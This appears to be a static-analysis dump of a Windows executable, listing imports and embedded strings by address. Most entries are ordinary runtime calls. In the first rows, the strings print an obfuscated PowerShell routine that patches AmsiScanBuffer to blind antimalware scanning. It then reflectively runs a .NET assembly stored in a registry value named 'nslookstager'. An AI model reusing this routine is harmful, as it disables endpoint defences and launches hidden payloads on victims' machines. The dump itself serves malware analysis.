reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1400012a6	0x140015800	string	0x1400011d0	function Local:Get-Delegate{Param([OutputType([Type])][Parameter(Position=0)][Type[]]$ParameterTypes,[Parameter(Position=1)][Type]$ReturnType)$TypeBuilder=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMe'+'mory'+'Module',$False).DefineType('MyDelegateType','Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate]);$TypeBuilder.DefineConstructor('RTSpecialName,HideBySig,Public',[Reflection.CallingConventions]::Standard,$ParameterTypes).SetImplementationFlags('Runtime,Managed');$TypeBuilder.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$ReturnType,$ParameterTypes).SetImplementationFlags('Runtime,Managed');Write-Output $TypeBuilder.CreateType();}$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.'+'Uns'+'afeNat'+'iveMetho'+'ds');$GetProcAddress=$NativeMethods.GetMethod('Ge'+'tPr'+'ocAdd'+'ress',[Reflection.BindingFlags]'Public,Static',$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);$LoadLibraryDelegate=Get-Delegate @([String])([IntPtr]);$VirtualProtectDelegate=Get-Delegate @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType())([Bool]);$Kernel32Ptr=$NativeMethods.GetMethod('Get'+'Modu'+'leHan'+'dle').Invoke($Null,@([Object]('kern'+'el'+'32.dll')));$LoadLibraryPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object]('Load'+'LibraryA')));$VirtualProtectPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object]('Vir'+'tual'+'Pro'+'tect')));$AmsiPtr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryPtr,$LoadLibraryDelegate).Invoke('a'+'m'+'si.dll');$AmsiScanBufferPtr=$GetProcAddress.Invoke($Null,@([Object]$AmsiPtr,[Object]('Ams'+'iSc'+'an'+'Buffer')));$OldProtect=0;[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDeleg
0x1400012b0	0x14000e0b0	import	0x1400011d0	KERNEL32.dll.lstrcatW
0x1400012b6	0x140016880	string	0x1400011d0	[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc3),0,$AmsiScanBufferPtr,6);
0x1400012c4	0x140016950	string	0x1400011d0	[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc2,0x18,0),0,$AmsiScanBufferPtr,8);
0x1400012cb	0x14000e0b0	import	0x1400011d0	KERNEL32.dll.lstrcatW
0x1400012d1	0x140016a30	string	0x1400011d0	[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDelegate).Invoke($AmsiScanBufferPtr,[uint32]8,0x20,[ref]$OldProtect);
0x1400012db	0x14000e0b0	import	0x1400011d0	KERNEL32.dll.lstrcatW
0x1400012e1	0x140016b90	string	0x1400011d0	[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::LocalMachine.OpenSubkey('SOFTWARE').GetValue('nslookstager')).EntryPoint.Invoke($Null,$Null)
0x1400012eb	0x14000e0b0	import	0x1400011d0	KERNEL32.dll.lstrcatW
0x1400012fb	0x14000e0b0	import	0x1400011d0	KERNEL32.dll.lstrcatW
0x140001301	0x140016cc0	string	0x1400011d0	Get-Delegate
0x140001308	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x14000132e	0x140016e80	string	0x1400011d0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x140001372	0x140016cc0	string	0x1400011d0	Get-Delegate
0x14000137c	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000139e	0x140016cc0	string	0x1400011d0	Get-Delegate
0x1400013a8	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400013bb	0x140016ce0	string	0x1400011d0	ParameterTypes
0x1400013c2	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001420	0x140016ce0	string	0x1400011d0	ParameterTypes
0x14000142a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000144e	0x140016ce0	string	0x1400011d0	ParameterTypes
0x140001458	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000146b	0x140016d00	string	0x1400011d0	ReturnType
0x140001472	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x1400014d0	0x140016d00	string	0x1400011d0	ReturnType
0x1400014da	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400014fe	0x140016d00	string	0x1400011d0	ReturnType
0x140001508	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000151b	0x140016d18	string	0x1400011d0	TypeBuilder
0x140001522	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001580	0x140016d18	string	0x1400011d0	TypeBuilder
0x14000158a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400015ae	0x140016d18	string	0x1400011d0	TypeBuilder
0x1400015b8	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400015cb	0x140016d30	string	0x1400011d0	NativeMethods
0x1400015d2	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001630	0x140016d30	string	0x1400011d0	NativeMethods
0x14000163a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000165e	0x140016d30	string	0x1400011d0	NativeMethods
0x140001668	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000167b	0x140016d50	string	0x1400011d0	GetProcAddress
0x140001682	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x1400016e0	0x140016d50	string	0x1400011d0	GetProcAddress
0x1400016ea	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000170e	0x140016d50	string	0x1400011d0	GetProcAddress
0x140001718	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000172b	0x140016d70	string	0x1400011d0	LoadLibraryDelegate
0x140001732	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001790	0x140016d70	string	0x1400011d0	LoadLibraryDelegate
0x14000179a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400017be	0x140016d70	string	0x1400011d0	LoadLibraryDelegate
0x1400017c8	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400017db	0x140016d98	string	0x1400011d0	VirtualProtectDelegate
0x1400017e2	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001840	0x140016d98	string	0x1400011d0	VirtualProtectDelegate
0x14000184a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000186e	0x140016d98	string	0x1400011d0	VirtualProtectDelegate
0x140001878	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000188b	0x140016dc8	string	0x1400011d0	Kernel32Ptr
0x140001892	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x1400018f0	0x140016dc8	string	0x1400011d0	Kernel32Ptr
0x1400018fa	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000191e	0x140016dc8	string	0x1400011d0	Kernel32Ptr
0x140001928	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x14000193b	0x140016de0	string	0x1400011d0	LoadLibraryPtr
0x140001942	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x1400019a0	0x140016de0	string	0x1400011d0	LoadLibraryPtr
0x1400019aa	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400019ce	0x140016de0	string	0x1400011d0	LoadLibraryPtr
0x1400019d8	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x1400019eb	0x140016e00	string	0x1400011d0	VirtualProtectPtr
0x1400019f2	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001a50	0x140016e00	string	0x1400011d0	VirtualProtectPtr
0x140001a5a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001a7e	0x140016e00	string	0x1400011d0	VirtualProtectPtr
0x140001a88	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001a9b	0x140016e28	string	0x1400011d0	AmsiPtr
0x140001aa2	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001b00	0x140016e28	string	0x1400011d0	AmsiPtr
0x140001b0a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001b2e	0x140016e28	string	0x1400011d0	AmsiPtr
0x140001b38	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001b4b	0x140016e38	string	0x1400011d0	AmsiScanBufferPtr
0x140001b52	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001bb0	0x140016e38	string	0x1400011d0	AmsiScanBufferPtr
0x140001bba	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001bde	0x140016e38	string	0x1400011d0	AmsiScanBufferPtr
0x140001be8	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001bfb	0x140016e60	string	0x1400011d0	OldProtect
0x140001c02	0x14000e0b8	import	0x1400011d0	KERNEL32.dll.lstrlenW
0x140001c60	0x140016e60	string	0x1400011d0	OldProtect
0x140001c6a	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001c8e	0x140016e60	string	0x1400011d0	OldProtect
0x140001c98	0x14000e278	import	0x1400011d0	SHLWAPI.dll.StrStrIW
0x140001d0e	0x14000e288	import	0x140001ce0	ole32.dll.CoInitialize
0x140001d4a	0x14000e298	import	0x140001ce0	ole32.dll.CoCreateInstance
0x140001da4	0x140015768	string	0x140001ce0	powershell
0x140001eab	0x14000e290	import	0x140001ce0	ole32.dll.CoUninitialize
0x140001f00	0x14000e288	import	0x140001ee0	ole32.dll.CoInitialize
0x140001f3a	0x14000e298	import	0x140001ee0	ole32.dll.CoCreateInstance
0x140001f8d	0x14000e290	import	0x140001ee0	ole32.dll.CoUninitialize
0x140001fe0	0x14000e288	import	0x140001fc0	ole32.dll.CoInitialize
0x140002016	0x14000e298	import	0x140001fc0	ole32.dll.CoCreateInstance
0x14000203f	0x14000e290	import	0x140001fc0	ole32.dll.CoUninitialize
0x140002367	0x14000e110	import	0x14000235c	KERNEL32.dll.SetUnhandledExceptionFilter
0x140002370	0x14000e108	import	0x14000235c	KERNEL32.dll.UnhandledExceptionFilter
0x140002376	0x14000e088	import	0x14000235c	KERNEL32.dll.GetCurrentProcess
0x140002389	0x14000e078	import	0x14000235c	KERNEL32.dll.TerminateProcess
0x1400023b5	0x140002584	string	0x14000235c	@SVWH
0x140002521	0x14000e0f0	import	0x140002514	KERNEL32.dll.RtlCaptureContext
0x140002539	0x14000e0f8	import	0x140002514	KERNEL32.dll.RtlLookupFunctionEntry
0x140002570	0x14000e100	import	0x140002514	KERNEL32.dll.RtlVirtualUnwind
0x14000258f	0x14000e0f0	import	0x140002584	KERNEL32.dll.RtlCaptureContext
0x1400025a9	0x14000e0f8	import	0x140002584	KERNEL32.dll.RtlLookupFunctionEntry
0x1400025e0	0x14000e100	import	0x140002584	KERNEL32.dll.RtlVirtualUnwind
0x140002641	0x14000e3c8	string	0x14000263c	bad allocation
0x14000269d	0x14000e3f0	string	0x140002698	bad array new length
0x140002789	0x14000e398	string	0x140002764	Unknown exception
0x140002a14	0x14000e130	import	0x1400029e8	KERNEL32.dll.GetSystemTimeAsFileTime
0x140002a22	0x14000e128	import	0x1400029e8	KERNEL32.dll.GetCurrentThreadId
0x140002a2e	0x14000e040	import	0x1400029e8	KERNEL32.dll.GetCurrentProcessId
0x140002a3e	0x14000e120	import	0x1400029e8	KERNEL32.dll.QueryPerformanceCounter
0x140002aaf	0x14000e138	import	0x140002aa8	KERNEL32.dll.InitializeSListHead
0x140002b58	0x14000e0f0	import	0x140002b10	KERNEL32.dll.RtlCaptureContext
0x140002b72	0x14000e0f8	import	0x140002b10	KERNEL32.dll.RtlLookupFunctionEntry
0x140002bb3	0x14000e100	import	0x140002b10	KERNEL32.dll.RtlVirtualUnwind
0x140002c07	0x14000e140	import	0x140002b10	KERNEL32.dll.IsDebuggerPresent
0x140002c28	0x14000e110	import	0x140002b10	KERNEL32.dll.SetUnhandledExceptionFilter
0x140002c33	0x14000e108	import	0x140002b10	KERNEL32.dll.UnhandledExceptionFilter
0x140002c78	0x14000e148	import	0x140002c5c	KERNEL32.dll.GetStartupInfoW
0x140002ca6	0x14000e048	import	0x140002ca0	KERNEL32.dll.GetModuleHandleW
0x140002cfb	0x14000e110	import	0x140002cf4	KERNEL32.dll.SetUnhandledExceptionFilter
0x1400032c8	0x14000e158	import	0x140003284	KERNEL32.dll.RtlPcToFileHeader
0x14000330e	0x14000e160	import	0x140003284	KERNEL32.dll.RaiseException
0x1400036a7	0x14000e018	import	0x140003688	KERNEL32.dll.GetLastError
0x14000372e	0x14000e168	import	0x140003688	KERNEL32.dll.SetLastError
0x140003807	0x14000e180	import	0x1400037e8	KERNEL32.dll.DeleteCriticalSection
0x1400038a3	0x14000e1b0	import	0x140003820	KERNEL32.dll.LoadLibraryExW
0x1400038b1	0x14000e018	import	0x140003820	KERNEL32.dll.GetLastError
0x1400038c3	0x14000f2a8	string	0x140003820	api-ms-
0x1400038db	0x14000e1b0	import	0x140003820	KERNEL32.dll.LoadLibraryExW
0x140003921	0x14000e050	import	0x140003820	KERNEL32.dll.FreeLibrary
0x14000392d	0x14000e038	import	0x140003820	KERNEL32.dll.GetProcAddress
0x140003975	0x14000f2c0	string	0x14000396c	FlsAlloc
0x140003985	0x14000f2c0	string	0x14000396c	FlsAlloc
0x1400039aa	0x14000e190	import	0x14000396c	KERNEL32.dll.TlsAlloc
0x1400039bc	0x14000f2d8	string	0x1400039b4	FlsFree
0x1400039cf	0x14000f2d8	string	0x1400039b4	FlsFree
0x1400039f3	0x14000e1a8	import	0x1400039b4	KERNEL32.dll.TlsFree
0x140003a04	0x14000f2e8	string	0x1400039fc	FlsGetValue
0x140003a17	0x14000f2e8	string	0x1400039fc	FlsGetValue
0x140003a3b	0x14000e198	import	0x1400039fc	KERNEL32.dll.TlsGetValue
0x140003a51	0x14000f300	string	0x140003a44	FlsSetValue
0x140003a5a	0x14000f300	string	0x140003a44	FlsSetValue
0x140003a84	0x14000e1a0	import	0x140003a44	KERNEL32.dll.TlsSetValue
0x140003aaa	0x14000f318	string	0x140003a98	InitializeCriticalSectionEx
0x140003abd	0x14000f318	string	0x140003a98	InitializeCriticalSectionEx
0x140003ae3	0x14000e188	import	0x140003a98	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x140004aa7	0x140004ab2	string	0x140004a7c	<"u\a@
0x140004ab0	0x140004ad1	string	0x140004a7c	< w\tH
0x140004adc	0x140004ad1	string	0x140004a7c	< w\tH
0x140004cb7	0x14000e048	import	0x140004ca6	KERNEL32.dll.GetModuleHandleW
0x140004d7d	0x14000e088	import	0x140004d54	KERNEL32.dll.GetCurrentProcess
0x140004d88	0x14000e078	import	0x140004d54	KERNEL32.dll.TerminateProcess
0x140004d97	0x14000e1c8	import	0x140004d54	KERNEL32.dll.ExitProcess
0x140004db3	0x14000f418	string	0x140004da0	mscoree.dll
0x140004dbc	0x14000e1d0	import	0x140004da0	KERNEL32.dll.GetModuleHandleExW
0x140004dcb	0x14000f430	string	0x140004da0	CorExitProcess
0x140004dd2	0x14000e038	import	0x140004da0	KERNEL32.dll.GetProcAddress
0x140004def	0x14000e050	import	0x140004da0	KERNEL32.dll.FreeLibrary
0x14000563a	0x14000e118	import	0x140005614	KERNEL32.dll.IsProcessorFeaturePresent
0x140005ac3	0x14000e018	import	0x140005ab4	KERNEL32.dll.GetLastError
0x140005b61	0x14000e168	import	0x140005ab4	KERNEL32.dll.SetLastError
0x140005c3f	0x14000e018	import	0x140005c30	KERNEL32.dll.GetLastError
0x140005cdd	0x14000e168	import	0x140005c30	KERNEL32.dll.SetLastError
0x140005dd5	0x14000e0f0	import	0x140005d5c	KERNEL32.dll.RtlCaptureContext
0x140005ded	0x14000e0f8	import	0x140005d5c	KERNEL32.dll.RtlLookupFunctionEntry
0x140005e28	0x14000e100	import	0x140005d5c	KERNEL32.dll.RtlVirtualUnwind
0x140005e61	0x14000e140	import	0x140005d5c	KERNEL32.dll.IsDebuggerPresent
0x140005e6b	0x14000e110	import	0x140005d5c	KERNEL32.dll.SetUnhandledExceptionFilter
0x140005e76	0x14000e108	import	0x140005d5c	KERNEL32.dll.UnhandledExceptionFilter
0x140005f99	0x14000e118	import	0x140005f90	KERNEL32.dll.IsProcessorFeaturePresent
0x140005fbe	0x14000e088	import	0x140005f90	KERNEL32.dll.GetCurrentProcess
0x140005fd0	0x14000e078	import	0x140005f90	KERNEL32.dll.TerminateProcess
0x140006153	0x14000e1b0	import	0x1400060b0	KERNEL32.dll.LoadLibraryExW
0x140006161	0x14000e018	import	0x1400060b0	KERNEL32.dll.GetLastError
0x140006175	0x14000f2a8	string	0x1400060b0	api-ms-
0x140006188	0x14000fba8	string	0x1400060b0	ext-ms-
0x1400061a3	0x14000e1b0	import	0x1400060b0	KERNEL32.dll.LoadLibraryExW
0x1400061dc	0x14000e050	import	0x1400060b0	KERNEL32.dll.FreeLibrary
0x140006208	0x14000e038	import	0x1400060b0	KERNEL32.dll.GetProcAddress
0x140006291	0x14000fc58	string	0x140006288	AppPolicyGetProcessTerminationMethod
0x1400062a4	0x14000fc58	string	0x140006288	AppPolicyGetProcessTerminationMethod
0x1400062ec	0x14000fbc0	string	0x1400062d8	AreFileApisANSI
0x140006330	0x14000f2c0	string	0x140006314	FlsAlloc
0x140006355	0x14000e190	import	0x140006314	KERNEL32.dll.TlsAlloc
0x140006377	0x14000f2d8	string	0x14000635c	FlsFree
0x14000639b	0x14000e1a8	import	0x14000635c	KERNEL32.dll.TlsFree
0x1400063bf	0x14000f2e8	string	0x1400063a4	FlsGetValue
0x1400063e3	0x14000e198	import	0x1400063a4	KERNEL32.dll.TlsGetValue
0x140006402	0x14000f300	string	0x1400063ec	FlsSetValue
0x14000642c	0x14000e1a0	import	0x1400063ec	KERNEL32.dll.TlsSetValue
0x14000645c	0x14000fbf8	string	0x140006440	GetSystemTimePreciseAsFileTime
0x140006481	0x14000e130	import	0x140006440	KERNEL32.dll.GetSystemTimeAsFileTime
0x1400064ad	0x14000f318	string	0x140006488	InitializeCriticalSectionEx
0x1400064d3	0x14000e188	import	0x140006488	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x140006508	0x14000fc28	string	0x1400064ec	LCMapStringEx
0x140006519	0x14000fc28	string	0x1400064ec	LCMapStringEx
0x1400065ad	0x14000e1d8	import	0x1400064ec	KERNEL32.dll.LCMapStringW
0x1400065d4	0x14000fc40	string	0x1400065c8	LocaleNameToLCID
0x1400065de	0x14000fc40	string	0x1400065c8	LocaleNameToLCID
0x140006782	0x14000e170	import	0x140006770	KERNEL32.dll.EnterCriticalSection
0x1400067ab	0x14000e180	import	0x14000678c	KERNEL32.dll.DeleteCriticalSection
0x1400067d6	0x14000e178	import	0x1400067c4	KERNEL32.dll.LeaveCriticalSection
0x14000681e	0x14000e1e0	import	0x1400067e0	KERNEL32.dll.HeapAlloc
0x140006895	0x14000e1e0	import	0x140006840	KERNEL32.dll.HeapAlloc
0x1400068ce	0x14000e1e8	import	0x1400068b8	KERNEL32.dll.HeapFree
0x1400068e0	0x14000e018	import	0x1400068b8	KERNEL32.dll.GetLastError
0x1400069d2	0x14000e018	import	0x14000690c	KERNEL32.dll.GetLastError
0x140006b53	0x14000e018	import	0x140006a84	KERNEL32.dll.GetLastError
0x1400070af	0x1400070cc	string	0x140006fa4	@8|$Ht\fH
0x14000710a	0x14000e1f8	import	0x140006fa4	KERNEL32.dll.FindFirstFileExW
0x14000718d	0x1400071aa	string	0x140006fa4	@8|$ht\fH
0x14000721c	0x14000e200	import	0x140006fa4	KERNEL32.dll.FindNextFileW
0x140007259	0x140009b70	string	0x140006fa4	ATAUAVH
0x140007271	0x14000e1f0	import	0x140006fa4	KERNEL32.dll.FindClose
0x140007358	0x14000e018	import	0x1400072bc	KERNEL32.dll.GetLastError
0x14000740c	0x14000e1c0	import	0x1400073d0	KERNEL32.dll.GetModuleFileNameW
0x140007416	0x14000e018	import	0x1400073d0	KERNEL32.dll.GetLastError
0x1400076d6	0x14000e218	import	0x1400076ac	KERNEL32.dll.GetOEMCP
0x1400076ed	0x14000e210	import	0x1400076ac	KERNEL32.dll.GetACP
0x1400077fe	0x14000e220	import	0x1400077bc	KERNEL32.dll.GetCPInfo
0x140007880	0x140008ab0	string	0x1400077bc	@UATAUAVAWH
0x140007d03	0x14000e208	import	0x140007c98	KERNEL32.dll.IsValidCodePage
0x140007d4f	0x14000e220	import	0x140007c98	KERNEL32.dll.GetCPInfo
0x140007fe4	0x14000e228	import	0x140007fcc	KERNEL32.dll.GetCommandLineA
0x140007ff1	0x14000e230	import	0x140007fcc	KERNEL32.dll.GetCommandLineW
0x14000805b	0x14000e238	import	0x140008008	KERNEL32.dll.MultiByteToWideChar
0x1400080f3	0x14000e058	import	0x140008064	KERNEL32.dll.WideCharToMultiByte
0x140008115	0x14000e240	import	0x1400080fc	KERNEL32.dll.GetEnvironmentStringsW
0x1400081d9	0x14000e248	import	0x1400080fc	KERNEL32.dll.FreeEnvironmentStringsW
0x14000830d	0x14000e180	import	0x1400082e4	KERNEL32.dll.DeleteCriticalSection
0x1400083fc	0x14000e170	import	0x1400083dc	KERNEL32.dll.EnterCriticalSection
0x140008424	0x14000e178	import	0x140008404	KERNEL32.dll.LeaveCriticalSection
0x1400084a6	0x14000e250	import	0x14000842c	KERNEL32.dll.SetStdHandle
0x140008580	0x14000e148	import	0x140008560	KERNEL32.dll.GetStartupInfoW
0x1400085eb	0x14000e258	import	0x140008560	KERNEL32.dll.GetFileType
0x1400086c9	0x14000e1b8	import	0x140008650	KERNEL32.dll.GetStdHandle
0x1400086df	0x14000e258	import	0x140008650	KERNEL32.dll.GetFileType
0x140008be2	0x14000e260	import	0x140008ab0	KERNEL32.dll.GetStringTypeW
0x1400097a3	0x1400097aa	string	0x14000976c	HcȺ\b blocks=Basic Latin,Latin Extended-B
0x1400098f4	0x14000e170	import	0x1400098f0	KERNEL32.dll.EnterCriticalSection
0x140009900	0x14000e178	import	0x1400098fc	KERNEL32.dll.LeaveCriticalSection
0x14000998a	0x1400099a5	string	0x1400098fc	@8l$Ht\fH
0x1400099dd	0x140009a0e	string	0x1400098fc	HcA\bH;
0x1400099e2	0x140009a0e	string	0x1400098fc	HcA\bH;
0x140009a20	0x1400099a5	string	0x1400098fc	@8l$Ht\fH
0x140009a63	0x1400099a5	string	0x1400098fc	@8l$Ht\fH
0x14000a8a0	0x14000a51c	string	0x14000a834	@UATAUAVAWH
0x14000a9ea	0x14000e0d8	import	0x14000a99c	KERNEL32.dll.FlushFileBuffers
0x14000a9fe	0x14000e018	import	0x14000a99c	KERNEL32.dll.GetLastError
0x14000ab2b	0x14000e0d0	import	0x14000aabc	KERNEL32.dll.GetConsoleCP
0x14000abb9	0x14000aba9	string	0x14000aabc	D8T8>t\v
0x14000add5	0x14000e080	import	0x14000aabc	KERNEL32.dll.WriteFile
0x14000ae27	0x14000e080	import	0x14000aabc	KERNEL32.dll.WriteFile
0x14000b03f	0x14000e080	import	0x14000af8c	KERNEL32.dll.WriteFile
0x14000b05b	0x14000e018	import	0x14000af8c	KERNEL32.dll.GetLastError
0x14000b15a	0x14000e080	import	0x14000b090	KERNEL32.dll.WriteFile
0x14000b176	0x14000e018	import	0x14000b090	KERNEL32.dll.GetLastError
0x14000b2c3	0x14000e080	import	0x14000b1ac	KERNEL32.dll.WriteFile
0x14000b2e5	0x14000e018	import	0x14000b1ac	KERNEL32.dll.GetLastError
0x14000b508	0x14000e0c8	import	0x14000b408	KERNEL32.dll.GetConsoleMode
0x14000b588	0x14000e018	import	0x14000b408	KERNEL32.dll.GetLastError
0x14000b634	0x14000e080	import	0x14000b408	KERNEL32.dll.WriteFile
0x14000b63e	0x14000e018	import	0x14000b408	KERNEL32.dll.GetLastError
0x14000b756	0x14000e180	import	0x14000b6e4	KERNEL32.dll.DeleteCriticalSection
0x14000b999	0x14000b8fe	string	0x14000b8c0	D8/u\bA
0x14000bc73	0x14000bc81	string	0x14000bc18	fE9S
0x14000c3ce	0x140013eb0	string	0x14000c3ac	CONOUT$
0x14000c3e2	0x14000e068	import	0x14000c3ac	KERNEL32.dll.CreateFileW
0x14000c44d	0x14000e060	import	0x14000c41c	KERNEL32.dll.WriteConsoleW
0x14000c459	0x14000e018	import	0x14000c41c	KERNEL32.dll.GetLastError
0x14000c471	0x14000e028	import	0x14000c41c	KERNEL32.dll.CloseHandle
0x14000c47d	0x140013eb0	string	0x14000c41c	CONOUT$
0x14000c49c	0x14000e068	import	0x14000c41c	KERNEL32.dll.CreateFileW
0x14000c4bb	0x14000e060	import	0x14000c41c	KERNEL32.dll.WriteConsoleW
0x14000c65a	0x14000e028	import	0x14000c5f4	KERNEL32.dll.CloseHandle
0x14000c664	0x14000e018	import	0x14000c5f4	KERNEL32.dll.GetLastError
